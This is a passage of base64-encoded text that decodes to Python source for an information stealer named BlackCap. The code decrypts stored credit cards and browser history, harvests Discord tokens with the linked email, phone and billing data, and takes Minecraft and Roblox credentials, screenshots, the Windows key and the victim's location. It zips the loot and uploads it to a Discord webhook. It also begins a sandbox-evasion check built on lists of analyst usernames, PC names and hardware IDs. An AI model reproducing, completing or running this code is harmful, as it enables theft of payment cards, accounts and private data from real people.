NyZWRpdGNhcmRzLnR4dCIpLCAnYScsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6CiAgICAgICAgICAgIGZvciByZXMgaW4gY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCBuYW1lX29uX2NhcmQsIGV4cGlyYXRpb25fbW9udGgsIGV4cGlyYXRpb25feWVhciwgY2FyZF9udW1iZXJfZW5jcnlwdGVkIEZST00gY3JlZGl0X2NhcmRzIikuZmV0Y2hhbGwoKToKICAgICAgICAgICAgICAgIG5hbWVfb25fY2FyZCwgZXhwaXJhdGlvbl9tb250aCwgZXhwaXJhdGlvbl95ZWFyLCBjYXJkX251bWJlcl9lbmNyeXB0ZWQgPSByZXMKICAgICAgICAgICAgICAgIGlmIG5hbWVfb25fY2FyZCBhbmQgY2FyZF9udW1iZXJfZW5jcnlwdGVkICE9ICIiOgogICAgICAgICAgICAgICAgICAgIGYud3JpdGUoCiAgICAgICAgICAgICAgICAgICAgICAgIGYiTmFtZToge25hbWVfb25fY2FyZH0gICBFeHBpcmF0aW9uIE1vbnRoOiB7ZXhwaXJhdGlvbl9tb250aH0gICBFeHBpcmF0aW9uIFllYXI6IHtleHBpcmF0aW9uX3llYXJ9ICAgQ2FyZCBOdW1iZXI6IHtzZWxmLmRjcnB0X3ZhbChjYXJkX251bWJlcl9lbmNyeXB0ZWQsIHNlbGYubWFzdGVya2V5KX1cbiIpCiAgICAgICAgZi5jbG9zZSgpCiAgICAgICAgY3Vyc29yLmNsb3NlKCkKICAgICAgICBjb25uLmNsb3NlKCkKICAgICAgICBvcy5yZW1vdmUoY3JlZGl0X2NhcmRfdmF1bHQpCgoKICAgIEBleHRyYWN0X3RyeQogICAgZGVmIHN0ZWFsX2hpc3Rvcnkoc2VsZik6CiAgICAgICAgZiA9IG9wZW4obnRwYXRoLmpvaW4oc2VsZi5kaXIsICdHb29nbGUnLCAnSGlzdG9yeS50eHQnKSwgJ3cnLCBlbmNvZGluZz0iY3A0MzciLCBlcnJvcnM9J2lnbm9yZScpCgogICAgICAgIGRlZiB4dHJhY3R3Ymhpc3QoZGJfY3Vyc29yKToKICAgICAgICAgICAgd2ViID0gIiIKICAgICAgICAgICAgZGJfY3Vyc29yLmV4ZWN1dGUoJ1NFTEVDVCB0aXRsZSwgdXJsLCBsYXN0X3Zpc2l0X3RpbWUgRlJPTSB1cmxzJykKICAgICAgICAgICAgZm9yIGl0ZW0gaW4gZGJfY3Vyc29yLmZldGNoYWxsKCk6CiAgICAgICAgICAgICAgICB3ZWIgKz0gZiJTZWFyY2ggVGl0bGU6IHtpdGVtWzBdfVxuVVJMOiB7aXRlbVsxXX1cbkxBU1QgVklTSVQgVElNRToge3NlbGYuY252ZXJ0dGltKGl0ZW1bMl0pLnN0cmZ0aW1lKCclWS8lbS8lZCAtICVIOiVNOiVTJyl9XG5cbiIKICAgICAgICAgICAgcmV0dXJuIHdlYgoKCiAgICAgICAgZGVmIHh0cmFjdHdiczNyY2goZGJfY3Vyc29yKToKICAgICAgICAgICAgZGJfY3Vyc29yLmV4ZWN1dGUoJ1NFTEVDVCB0ZXJtIEZST00ga2V5d29yZF9zZWFyY2hfdGVybXMnKQogICAgICAgICAgICBzZWFyY2hfdGVybXMgPSAiIgoKICAgICAgICAgICAgZm9yIGl0ZW0gaW4gZGJfY3Vyc29yLmZldGNoYWxsKCk6CiAgICAgICAgICAgICAgICBpZiBpdGVtWzBdICE9ICIiOgogICAgICAgICAgICAgICAgICAgIHNlYXJjaF90ZXJtcyArPSBmIntpdGVtWzBdfVxuIgoKICAgICAgICAgICAgcmV0dXJuIHNlYXJjaF90ZXJtcwoKCiAgICAgICAgZm9yIHByb2YgaW4gb3MubGlzdGRpcihzZWxmLmNocm1tdXNlcmR0dCk6CgogICAgICAgICAgICBpZiByZS5tYXRjaChzZWxmLmNocm1yZ3gsIHByb2YpOgoKICAgICAgICAgICAgICAgIGxvZ2luX2RiID0gbnRwYXRoLmpvaW4oc2VsZi5jaHJtbXVzZXJkdHQsIHByb2YsICdIaXN0b3J5JykKICAgICAgICAgICAgICAgIGxvZ2luID0gc2VsZi5jcjM0dDNfZjFsa2VzKCkKCiAgICAgICAgICAgICAgICBzaHV0aWwuY29weTIobG9naW5fZGIsIGxvZ2luKQogICAgICAgICAgICAgICAgY29ubiA9IHNxbGl0ZTMuY29ubmVjdChsb2dpbikKICAgICAgICAgICAgICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkKCgogICAgICAgICAgICAgICAgc2VhcmNoX2hpc3RvcnkgPSB4dHJhY3R3YnMzcmNoKGN1cnNvcikKICAgICAgICAgICAgICAgIHdlYl9oaXN0b3J5ID0geHRyYWN0d2JoaXN0KGN1cnNvcikKCiAgICAgICAgICAgICAgICBmLndyaXRlKGYieycgJyoxN31TRUFSQ0hcbnsnLScqNTB9XG57c2VhcmNoX2hpc3Rvcnl9XG57JyAnKjE3fVxuXG5MaW5rcyBIaXN0b3J5XG57Jy0nKjUwfVxue3dlYl9oaXN0b3J5fSIpCgogICAgICAgICAgICAgICAgY3Vyc29yLmNsb3NlKCkKICAgICAgICAgICAgICAgIGNvbm4uY2xvc2UoKQogICAgICAgICAgICAgICAgb3MucmVtb3ZlKGxvZ2luKQogICAgICAgIGYuY2xvc2UoKQoKCiAgICBkZWYgbmF0aWZ5X21hdGNoZWRfdG9rZW5zKHNlbGYpOgoKICAgICAgICBmID0gb3BlbihzZWxmLmRpciArICJcXERpc2NvcmRfSW5mby50eHQiLCAidyIsIGVuY29kaW5nPSJjcDQzNyIsIGVycm9ycz0naWdub3JlJykKCiAgICAgICAgZm9yIHRva2VuIGluIHNlbGYudG9rZW5zOgogICAgICAgICAgICBqID0gaHR0cHguZ2V0KHNlbGYuZHNjYXAxLCBoZWFkZXJzPXNlbGYuZzN0X0godG9rZW4pKS5qc29uKCkKICAgICAgICAgICAgdXNlciA9IGouZ2V0KCd1c2VybmFtZScpICsgJyMnICsgc3RyKGouZ2V0KCJkaXNjcmltaW5hdG9yIikpCgogICAgICAgICAgICBiYWRnZXMgPSAiIgogICAgICAgICAgICBmbGFncyA9IGpbJ2ZsYWdzJ10KICAgICAgICAgICAgaWYgKGZsYWdzID09IDEpOgogICAgICAgICAgICAgICAgYmFkZ2VzICs9ICJTdGFmZiwgIgogICAgICAgICAgICBpZiAoZmxhZ3MgPT0gMik6CiAgICAgICAgICAgICAgICBiYWRnZXMgKz0gIlBhcnRuZXIsICIKICAgICAgICAgICAgaWYgKGZsYWdzID09IDQpOgogICAgICAgICAgICAgICAgYmFkZ2VzICs9ICJIeXBlc3F1YWQgRXZlbnQsICIKICAgICAgICAgICAgaWYgKGZsYWdzID09IDgpOgogICAgICAgICAgICAgICAgYmFkZ2VzICs9ICJHcmVlbiBCdWdodW50ZXIsICIKICAgICAgICAgICAgaWYgKGZsYWdzID09IDY0KToKICAgICAgICAgICAgICAgIGJhZGdlcyArPSAiSHlwZXNxdWFkIEJyYXZlcnksICIKICAgICAgICAgICAgaWYgKGZsYWdzID09IDEyOCk6CiAgICAgICAgICAgICAgICBiYWRnZXMgKz0gIkh5cGVTcXVhZCBCcmlsbGFuY2UsICIKICAgICAgICAgICAgaWYgKGZsYWdzID09IDI1Nik6CiAgICAgICAgICAgICAgICBiYWRnZXMgKz0gIkh5cGVTcXVhZCBCYWxhbmNlLCAiCiAgICAgICAgICAgIGlmIChmbGFncyA9PSA1MTIpOgogICAgICAgICAgICAgICAgYmFkZ2VzICs9ICJFYXJseSBTdXBwb3J0ZXIsICIKICAgICAgICAgICAgaWYgKGZsYWdzID09IDE2Mzg0KToKICAgICAgICAgICAgICAgIGJhZGdlcyArPSAiR29sZCBCdWdIdW50ZXIsICIKICAgICAgICAgICAgaWYgKGZsYWdzID09IDEzMTA3Mik6CiAgICAgICAgICAgICAgICBiYWRnZXMgKz0gIlZlcmlmaWVkIEJvdCBEZXZlbG9wZXIsICIKICAgICAgICAgICAgaWYgKGZsYWdzID09IDQxOTQzMDQpOgogICAgICAgICAgICAgICAgYmFkZ2VzICs9ICJBY3RpdmUgRGV2ZWxvcGVyLCAiCiAgICAgICAgICAgIGlmIChiYWRnZXMgPT0gIiIpOgogICAgICAgICAgICAgICAgYmFkZ2VzID0gIk5vbmUiCgogICAgICAgICAgICBlbWFpbCA9IGouZ2V0KCJlbWFpbCIpCiAgICAgICAgICAgIHBob25lID0gai5nZXQoInBob25lIikgaWYgai5nZXQoInBob25lIikgZWxzZSAiTm8gUGhvbmUgTnVtYmVyIGF0dGFjaGVkIgogICAgICAgICAgICBuaXRyb19kYXRhID0gaHR0cHguZ2V0KHNlbGYuZHNjYXAxICsgJy9iaWxsaW5nL3N1YnNjcmlwdGlvbnMnLCBoZWFkZXJzPXNlbGYuZzN0X0godG9rZW4pKS5qc29uKCkKICAgICAgICAgICAgaGFzX25pdHJvID0gRmFsc2UKICAgICAgICAgICAgaGFzX25pdHJvID0gYm9vbChsZW4obml0cm9fZGF0YSkgPiAwKQogICAgICAgICAgICBiaWxsaW5nID0gYm9vbChsZW4oanNvbi5sb2FkcyhodHRweC5nZXQoc2VsZi5kc2NhcDEgKyAiL2JpbGxpbmcvcGF5bWVudC1zb3VyY2VzIiwgaGVhZGVycz1zZWxmLmczdF9IKHRva2VuKSkudGV4dCkpID4gMCkKCgogICAgICAgICAgICBmLndyaXRlKGYieycgJyoxN317dXNlcn1cbnsnLScqNTB9XG5CaWxsaW5nPzoge2JpbGxpbmd9XG5OaXRybzoge2hhc19uaXRyb31cbkJhZGdlczoge2JhZGdlc31cblBob25lOiB7cGhvbmV9XG5Ub2tlbjoge3Rva2VufVxuRW1haWw6IHtlbWFpbH1cblxuIikKICAgICAgICBmLmNsb3NlKCkKCgogICAgZGVmIGdyYWJiX21jKHNlbGYpOgogICAgICAgIG1pbmVjcmFmdHBhdGggPSBudHBhdGguam9pbihzZWxmLmRpciwgJ01pbmVjcmFmdCcpCiAgICAgICAgb3MubWFrZWRpcnMobWluZWNyYWZ0cGF0aCwgZXhpc3Rfb2s9VHJ1ZSkKICAgICAgICBtYyA9IG50cGF0aC5qb2luKHNlbGYucm9hbWluZywgJy5taW5lY3JhZnQnKQoKCiAgICAgICAgdGdyYiA9IFsnbGF1bmNoZXJfYWNjb3VudHMuanNvbicsICdsYXVuY2hlcl9wcm9maWxlcy5qc29uJywgJ3VzZXJjYWNoZS5qc29uJywgJ2xhdW5jaGVyX2xvZy50eHQnXQoKCiAgICAgICAgZm9yIF9maWxlIGluIHRncmI6CiAgICAgICAgICAgIGlmIG50cGF0aC5leGlzdHMobnRwYXRoLmpvaW4obWMsIF9maWxlKSk6CiAgICAgICAgICAgICAgICBzaHV0aWwuY29weTIobnRwYXRoLmpvaW4obWMsIF9maWxlKSwgbWluZWNyYWZ0cGF0aCArIHNlbGYuc2VwICsgX2ZpbGUpCgogICAgICAgICAgICAgICAgCgogICAgZGVmIGdyYWJiX3JvYmxveChzZWxmKToKICAgICAgICBkZWYgc3VicHJvYyhwYXRoKToKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgcmV0dXJuIHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KAogICAgICAgICAgICAgICAgICAgIGZyInBvd2Vyc2hlbGwgR2V0LUl0ZW1Qcm9wZXJ0eVZhbHVlIC1QYXRoIHtwYXRofTpTT0ZUV0FSRVxSb2Jsb3hcUm9ibG94U3R1ZGlvQnJvd3Nlclxyb2Jsb3guY29tIC1OYW1lIC5ST0JMT1NFQ1VSSVRZIiwKICAgICAgICAgICAgICAgICAgICBjcmVhdGlvbmZsYWdzPTB4MDgwMDAwMDApLmRlY29kZSgpLnJzdHJpcCgpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICByZXR1cm4gTm9uZQogICAgICAgIHJlZ19jb29raWUgPSBzdWJwcm9jKHInSEtMTScpCiAgICAgICAgaWYgbm90IHJlZ19jb29raWU6CiAgICAgICAgICAgIHJlZ19jb29raWUgPSBzdWJwcm9jKHInSEtDVScpCiAgICAgICAgaWYgcmVnX2Nvb2tpZToKICAgICAgICAgICAgc2VsZi5yb2Jsb3hjb29raWVzLmFwcGVuZChyZWdfY29va2llKQogICAgICAgIGlmIHNlbGYucm9ibG94Y29va2llczoKICAgICAgICAgICAgd2l0aCBvcGVuKHNlbGYuZGlyICsgIlxcUm9ibG94X0Nvb2tpZXMudHh0IiwgInciKSBhcyBmOgogICAgICAgICAgICAgICAgZm9yIGkgaW4gc2VsZi5yb2Jsb3hjb29raWVzOgogICAgICAgICAgICAgICAgICAgIGYud3JpdGUoaSArICdcbicpCgogICAgZGVmIHN0ZWFsX3NjcmVlbihzZWxmKToKICAgICAgICBpbWFnZSA9IEltYWdlR3JhYi5ncmFiKAogICAgICAgICAgICBiYm94PU5vbmUsCiAgICAgICAgICAgIGluY2x1ZGVfbGF5ZXJlZF93aW5kb3dzPUZhbHNlLAogICAgICAgICAgICBhbGxfc2NyZWVucz1UcnVlLAogICAgICAgICAgICB4ZGlzcGxheT1Ob25lCiAgICAgICAgKQogICAgICAgIGltYWdlLnNhdmUoc2VsZi5kaXIgKyAiXFxTY3JlZW5zaG90LnBuZyIpCiAgICAgICAgaW1hZ2UuY2xvc2UoKQoKICAgIGRlZiBzeXN0ZW1faW5mb3JtYXRpb25zKHNlbGYpOgogICAgICAgIGFib3V0ID0gZiIiIgp7aW5mb2NvbX0gfCB7dmN0bV9wY30KV2luZG93cyBrZXk6IHtzZWxmLncxbmszM3l9CldpbmRvd3MgdmVyc2lvbjoge3NlbGYudzFudjNyfQpSQU06IHtyNG19R0IKRElTSzoge2Qxc2t9R0IKSFdJRDoge3NlbGYudXVpZHduZHp9CklQOiB7c2VsZi5pcH0KQ2l0eToge3NlbGYuY2l0eX0KQ291bnRyeToge3NlbGYuY291bnRyeX0KUmVnaW9uOiB7c2VsZi5yZWdpb259Ck9yZzoge3NlbGYub3JnfQpHb29nbGVNYXBzOiB7c2VsZi5nb29nbGVtYXB9CiAgICAgICAgIiIiCiAgICAgICAgd2l0aCBvcGVuKHNlbGYuZGlyICsgIlxcU3lzdGVtX0luZm8udHh0IiwgInciLCBlbmNvZGluZz0idXRmLTgiLCBlcnJvcnM9J2lnbm9yZScpIGFzIGY6CiAgICAgICAgICAgIGYud3JpdGUoYWJvdXQpCgoKCgoKCgogICAgZGVmIGZpbmlzaGVkX2JjKHNlbGYpOgogICAgICAgIGZvciBpIGluIG9zLmxpc3RkaXIoc2VsZi5kaXIpOgogICAgICAgICAgICBpZiBpLmVuZHN3aXRoKCcudHh0Jyk6CiAgICAgICAgICAgICAgICBwYXRoID0gc2VsZi5kaXIgKyBzZWxmLnNlcCArIGkKICAgICAgICAgICAgICAgIHdpdGggb3BlbihwYXRoLCAiciIsIGVycm9ycz0iaWdub3JlIikgYXMgZmY6CiAgICAgICAgICAgICAgICAgICAgeCA9IGZmLnJlYWQoKQogICAgICAgICAgICAgICAgICAgIGlmIG5vdCB4OgogICAgICAgICAgICAgICAgICAgICAgICBmZi5jbG9zZSgpCiAgICAgICAgICAgICAgICAgICAgICAgIG9zLnJlbW92ZShwYXRoKQogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbihwYXRoLCAidyIsIGVuY29kaW5nPSJ1dGYtOCIsIGVycm9ycz0iaWdub3JlIikgYXMgZjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYud3JpdGUoIkJsYWNrIENhcCBDcmVhdGUgQnkgS1MuSCB8IGh0dHBzOi8vZ2l0aHViLmNvbS9LU0NIZHNjXG5cbiIpCiAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbihwYXRoLCAiYSIsIGVuY29kaW5nPSJ1dGYtOCIsIGVycm9ycz0iaWdub3JlIikgYXMgZnA6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmcC53cml0ZSh4ICsgIlxuXG5CbGFjayBDYXAgQ3JlYXRlIEJ5IEtTQ0ggfCBodHRwczovL2dpdGh1Yi5jb20vS1NDSGRzYyIpCgogICAgICAgIF96aXBmaWxlID0gbnRwYXRoLmpvaW4oc2VsZi5hcHBkYXRhLCBmJ0JDLVt7aW5mb2NvbX1dLnppcCcpCiAgICAgICAgemlwcGVkX2ZpbGUgPSB6aXBmaWxlLlppcEZpbGUoX3ppcGZpbGUsICJ3IiwgemlwZmlsZS5aSVBfREVGTEFURUQpCiAgICAgICAgYWJzX3NyYyA9IG50cGF0aC5hYnNwYXRoKHNlbGYuZGlyKQogICAgICAgIGZvciBkaXJuYW1lLCBfLCBmaWxlcyBpbiBvcy53YWxrKHNlbGYuZGlyKToKICAgICAgICAgICAgZm9yIGZpbGVuYW1lIGluIGZpbGVzOgogICAgICAgICAgICAgICAgYWJzbmFtZSA9IG50cGF0aC5hYnNwYXRoKG50cGF0aC5qb2luKGRpcm5hbWUsIGZpbGVuYW1lKSkKICAgICAgICAgICAgICAgIGFyY25hbWUgPSBhYnNuYW1lW2xlbihhYnNfc3JjKSArIDE6XQogICAgICAgICAgICAgICAgemlwcGVkX2ZpbGUud3JpdGUoYWJzbmFtZSwgYXJjbmFtZSkKICAgICAgICB6aXBwZWRfZmlsZS5jbG9zZSgpCgogICAgICAgIGZpbGVfY291bnQsIGZpbGVzX2ZvdW5kLCB0b2tlbnMgPSAwLCAnJywgJycKICAgICAgICBmb3IgXywgX18sIGZpbGVzIGluIG9zLndhbGsoc2VsZi5kaXIpOgogICAgICAgICAgICBmb3IgX2ZpbGUgaW4gZmlsZXM6CiAgICAgICAgICAgICAgICBmaWxlc19mb3VuZCArPSBmIuODu3tfZmlsZX1cbiIKICAgICAgICAgICAgICAgIGZpbGVfY291bnQgKz0gMQogICAgICAgIGZvciB0a24gaW4gc2VsZi50b2tlbnM6CiAgICAgICAgICAgIHRva2VucyArPSBmJ3t0a259XG5cbicKICAgICAgICBmaWxlQ291bnQgPSBmIntmaWxlX2NvdW50fSBGaWxlcyBGb3VuZDogIgoKICAgICAgICBlbWJlZCA9IHsKICAgICAgICAgICAgJ25hbWUnOiAiQmxhY2tDYXAiLAogICAgICAgICAgICAnYXZhdGFyX3VybCc6ICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vS1NDSGRzYy9CbGFja0NhcC1Bc3NldHMvbWFpbi9ibGFja2NhcCUyMCgyKS5wbmcnLAogICAgICAgICAgICAnZW1iZWRzJzogWwogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICdhdXRob3InOiB7CiAgICAgICAgICAgICAgICAgICAgICAgICduYW1lJzogZidCbGFja0NhcCB2Mi4zJywKICAgICAgICAgICAgICAgICAgICAgICAgJ3VybCc6ICdodHRwczovL2dpdGh1Yi5jb20vS1NDSGRzYycsCiAgICAgICAgICAgICAgICAgICAgICAgICdpY29uX3VybCc6ICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vS1NDSGRzYy9EZXN0cnVDb3JkLUluamVjdC9tYWluL2JsYWNrY2FwLmdpZicKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgICdjb2xvcic6IDM3NDI3NiwKICAgICAgICAgICAgICAgICAgICAnZGVzY3JpcHRpb24nOiBmJ1tCbGFja0NhcCBoYXMgR2VvIExvY2FsaXNlZCB0aGlzIGd1eV0oe3NlbGYuZ29vZ2xlbWFwfSknLAogICAgICAgICAgICAgICAgICAgICdmaWVsZHMnOiBbCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICduYW1lJzogJ1x1MjAwYicsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAndmFsdWUnOiBmJycnYGBgZml4CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSVA6IHtzZWxmLmlwLnJlcGxhY2UoIiAiLCAiICIpIGlmIHNlbGYuaXAgZWxzZSAiTi9BIn0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBPcmc6IHtzZWxmLm9yZy5yZXBsYWNlKCIgIiwgIiAiKSBpZiBzZWxmLm9yZyBlbHNlICJOL0EifQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENpdHk6IHtzZWxmLmNpdHkucmVwbGFjZSgiICIsICIgIikgaWYgc2VsZi5jaXR5IGVsc2UgIk4vQSJ9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUmVnaW9uOiB7c2VsZi5yZWdpb24ucmVwbGFjZSgiICIsICIgIikgaWYgc2VsZi5yZWdpb24gZWxzZSAiTi9BIn0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb3VudHJ5OiB7c2VsZi5jb3VudHJ5LnJlcGxhY2UoIiAiLCAiICIpIGlmIHNlbGYuY291bnRyeSBlbHNlICJOL0EifWBgYAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJycnLnJlcGxhY2UoJyAnLCAnJyksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaW5saW5lJzogVHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbmFtZSc6ICdcdTIwMGInLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogZicnJ2BgYGZpeAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvbXB1dGVyIE5hbWU6IHt2Y3RtX3BjLnJlcGxhY2UoIiAiLCAiICIpfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdpbmRvd3MgS2V5OiB7c2VsZi53MW5rMzN5LnJlcGxhY2UoIiAiLCAiICIpfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdpbmRvd3MgVmVyOiB7c2VsZi53MW52M3IucmVwbGFjZSgiICIsICIgIil9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRGlzayBTdG9ja2FnZToge2Qxc2t9R0IKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBSYW0gU3RvY2thZ2U6IHtyNG19R0JgYGAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICcnJy5yZXBsYWNlKCcgJywgJycpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2lubGluZSc6IFRydWUKICAgICAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ25hbWUnOiAnKiotIFRva2VuczoqKicsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAndmFsdWUnOiBmJycnYGBgeWFtbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHt0b2tlbnMgaWYgdG9rZW5zIGVsc2UgInRva2VucyBub3QgZm91bmQifWBgYAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJycnLnJlcGxhY2UoJyAnLCAnJyksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaW5saW5lJzogRmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ25hbWUnOiBmaWxlQ291bnQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAndmFsdWUnOiBmJycnYGBgaW5pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgWwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtmaWxlc19mb3VuZC5zdHJpcCgpfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF1gYGAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICcnJy5yZXBsYWNlKCcgJywgJycpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2lubGluZSc6IEZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBdLAogICAgICAgICAgICAgICAgICAgICdmb290ZXInOiB7CiAgICAgICAgICAgICAgICAgICAgICAgICd0ZXh0JzogJ0JsYWNrIENhcCBDcmVhdGUgQnkgS1NDSOODu2h0dHBzOi8vZ2l0aHViLmNvbS9LU0NIZHNjJwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgXQogICAgICAgIH0KCgogICAgICAgIHdpdGggb3BlbihfemlwZmlsZSwgJ3JiJykgYXMgZjoKICAgICAgICAgICAgaWYgc2VsZi5yZWdleF93ZWJob29rX2RzYyBpbiBzZWxmLmRpc2NvcmRfd2ViaG9vazoKICAgICAgICAgICAgICAgIGh0dHB4LnBvc3Qoc2VsZi5kaXNjb3JkX3dlYmhvb2ssIGpzb249ZW1iZWQpCiAgICAgICAgICAgICAgICBodHRweC5wb3N0KHNlbGYuZGlzY29yZF93ZWJob29rLCBmaWxlcz17J3VwbG9hZF9maWxlJzogZn0pCiAgICAgICAgb3MucmVtb3ZlKF96aXBmaWxlKQoKCgoKCgoKY2xhc3MgTm9EZWJ1Z2coRnVuY3Rpb25zKToKICAgIGluVk0gPSBGYWxzZQoKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLnByb2Nlc3NlcyA9IGxpc3QoKQoKICAgICAgICBzZWxmLmJsdXNldXJzID0gWwogICAgICAgICAgICAiV0RBR1V0aWxpdHlBY2NvdW50IiwgIkJ2SkNoUlBuc3huIiwgIkhhcnJ5IEpvaG5zb24iLCAiU3FnRk9mM0ciLCAiUkd6Y0JVeXJ6blJlZyIsICJoN2RrMXhQciIsIlJvYmVydCIsICJBYmJ5IiwgIlBldGVyIFdpbHNvbiIsICJobWFyYyIsICJwYXRleCIsICJKT0hOLVBDIiwgIlJEaEowQ05GZXZ6WCIsICJrRWVjZk13Z2oiLCAiRnJhbmsiLCAiOE5sMENvbE5RNWJxIiwKICAgICAgICAgICAgIkxpc2EiLCAiSm9obiIsICJnZW9yZ2UiLCAiUHhtZFVPcFZ5eCIsICI4Vml6U00iLCAidzBmanVPVm1DY1A1QSIsICJsbVZ3amo5YiIsICJQcU9OakhWd2V4c1MiLCAiM3UydjltOCIsICJKdWxpYSIsICJIRVVlUnpsIiwKICAgICAgICBdCiAgICAgICAgc2VsZi5ibHBjbmFtZSA9IFsKICAgICAgICAgICAgIkRFU0tUT1AtQ0RMTlZPUSIsICJCRUU3MzcwQy04QzBDLTQiLCAiREVTS1RPUC1OQUtGRk1UIiwgIldJTi01RTA3Q09TOUFMUiIsICJCMzBGMDI0Mi0xQzZBLTQiLCAiREVTS1RPUC1WUlNRTEFHIiwgIlE5SUFUUktQUkgiLCAiWEM2NFpCIiwgIkRFU0tUT1AtRDAxOUdETSIsCiAgICAgICAgICAgICJERVNLVE9QLVdJOENMRVQiLCAiU0VSVkVSMSIsICJMSVNBLVBDIiwgIkpPSE4tUEMiLCAiREVTS1RPUC1CMFQ5M0Q2IiwgIkRFU0tUT1AtMVBZS1AyOSIsICJERVNLVE9QLTFZMjQzM1IiLCAiV0lMRVlQQyIsICJXT1JLIiwgIjZDNEU3MzNGLUMyRDktNCIsCiAgICAgICAgICAgICJSQUxQSFMtUEMiLCAiREVTS1RPUC1XRzNNWUpTIiwgIkRFU0tUT1AtN1hDNkdFWiIsICJERVNLVE9QLTVPVjlTME8iLCAiUWFyWmhyZEJwaiIsICJPUkVMRUVQQyIsICJBUkNISUJBTERQQyIsICJKVUxJQS1QQyIsICJkMWJuSmtmVmxIIiwgIkRFU0tUT1AtQjBUOTNENiIKICAgICAgICBdCiAgICAgICAgc2VsZi5ibGh3aWQgPSBbCiAgICAgICAgICAgICI3QUI1QzQ5NC0zOUY1LTQ5NDEtOTE2My00N0Y1NEQ2RDUwMTYiLCAiMDMyRTAyQjQtMDQ5OS0wNUMzLTA4MDYtM0MwNzAwMDgwMDA5IiwgIjAzREUwMjk0LTA0ODAtMDVERS0xQTA2LTM1MDcwMDA4MDAwOSIsCiAgICAgICAgICAgICIxMTExMTExMS0yMjIyLTMzMzMtNDQ0NC01NTU1NTU1NTU1NTUiLCAiNkYzQ0E1RUMtQkVDOS00QTRELTgyNzQtMTExNjhGNjQwMDU4IiwgIkFERUVFRTlFLUVGMEEtNkI4NC1CMTRCLUI4M0E1NEFGQzU0OCIsCiAgICAgICAgICAgICI0QzRDNDU0NC0wMDUwLTM3MTAtODA1OC1DQUMwNEY1OTM0NEEiLCAiMDAwMDAwMDAtMDAwMC0wMDAwLTAwMDAtQUMxRjZCRDA0OTcyIiwgIjc5QUY1Mjc5LTE2Q0YtNDA5NC05NzU4LUY4OEE2MTZEODFCNCIsCiAgICAgICAgICAgICI1QkQyNEQ1Ni03ODlGLTg0NjgtN0NEQy1DQUE3MjIyQ0MxMjEiLCAiNDk0MzRENTMtMDIwMC05MDY1LTI1MDAtNjU5MDI1MDBFNDM5IiwgIjQ5NDM0RDUzLTAyMDAtOTAzNi0yNTAwLTM2OTAyNTAwRjAyMiIsCiAgICAgICAgICAgICI3NzdEODRCMy04OEQxLTQ1MUMtOTNFNC1EMjM1MTc3NDIwQTciLCAiNDk0MzRENTMtMDIwMC05MDM2LTI1MDAtMzY5MDI1MDAwQzY1IiwgIkIxMTEyMDQyLTUyRTgtRTI1Qi0zNjU1LTZBNEY1NDE1NURCRiIsCiAgICAgICAgICAgICIwMDAwMDAwMC0wMDAwLTAwMDAtMDAwMC1BQzFGNkJEMDQ4RkUiLCAiRUIxNjkyNEItRkI2RC00RkExLTg2NjYtMTdCOTFGNjJGQjM3IiwgIkExNUE5MzBDLTgyNTEtOTY0NS1BRjYzLUU0NUFENzI4QzIwQyIsCiAgICAgICAgICAgICI2N0U1OTVFQi01NEFDLTRGRjA